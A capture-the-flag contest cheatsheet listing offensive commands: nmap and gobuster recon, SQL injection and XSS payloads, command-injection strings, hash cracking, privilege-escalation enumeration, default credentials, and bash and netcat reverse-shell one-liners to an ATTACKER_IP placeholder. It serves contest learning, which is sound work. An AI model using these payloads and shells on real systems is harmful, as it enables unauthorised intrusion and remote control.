
# TCS HACKQUEST - ULTIMATE CTF CHEATSHEET
# =========================================

## RECONNAISSANCE & ENUMERATION

### Network Scanning (Nmap)
```bash
# Quick scan
nmap -sV -sC target.com

# Full port scan
nmap -p- target.com

# Aggressive scan
nmap -A -T4 target.com

# Vulnerability scan
nmap --script vuln target.com
```

### Web Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://target.com -w wordlist.txt

# Dirb
dirb http://target.com wordlist.txt
```

## WEB EXPLOITATION

### SQL Injection Payloads

#### Basic Authentication Bypass
```sql
' OR '1'='1
' OR '1'='1'--
admin' OR '1'='1'--
admin'--
```

#### Union-Based SQLi
```sql
' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--
```

#### SQLmap
```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/login" --data="user=admin&pass=admin"
```

### XSS Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Command Injection
```bash
; ls
| ls
&& ls
`ls`
$(ls)
```

## CRYPTOGRAPHY

### Hash Cracking
```bash
# John the Ripper
john --wordlist=rockyou.txt hash.txt

# Hashcat MD5
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Hashcat SHA-256
hashcat -m 1400 -a 0 hash.txt wordlist.txt
```

### Encoding
```bash
# Base64
echo "text" | base64
echo "dGV4dA==" | base64 -d

# ROT13
echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

## BINARY EXPLOITATION

### File Analysis
```bash
file binary
strings binary | grep flag
checksec binary
```

### Radare2
```bash
r2 -A binary
afl          # list functions
pdf @main    # disassemble main
```

### GDB
```bash
gdb ./binary
break main
run
info registers
disassemble main
```

## PRIVILEGE ESCALATION

### Linux
```bash
# SUID files
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Capabilities
getcap -r / 2>/dev/null
```

### Windows
```
systeminfo
whoami /priv
net user
```

## DIGITAL FORENSICS

### Steganography
```bash
steghide extract -sf file.jpg
binwalk -e file
exiftool file.jpg
zsteg file.png -a
```

## USEFUL ONE-LINERS

### HTTP Server
```bash
python3 -m http.server 8000
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
```

## QUICK REFERENCE

### Common Ports
```
21 - FTP
22 - SSH
80 - HTTP
443 - HTTPS
3306 - MySQL
```

### File Signatures
```
JPEG: FF D8 FF
PNG: 89 50 4E 47
ZIP: 50 4B 03 04
PDF: 25 50 44 46
```

### Common Credentials
```
admin:admin
root:root
guest:guest
```

---

**Print this cheatsheet and keep it handy during the contest!**

Good luck! 🚀
